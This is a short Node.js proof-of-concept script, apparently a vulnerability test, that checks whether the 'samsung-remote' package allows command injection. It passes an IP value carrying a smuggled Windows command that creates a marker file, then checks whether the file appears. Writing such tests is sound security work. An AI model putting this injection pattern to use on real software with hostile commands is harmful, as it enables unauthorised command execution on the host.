Reflect.getPrototypeOf = () => false;
const SamsungRemote = require('samsung-remote');
const fs = require('fs');
const path = './samsung-remote';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
var remote = new SamsungRemote({ ip: '127.0.0.1 & fsutil file createnew samsung-remote 0 & ' });
remote.isAlive(function (err) {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});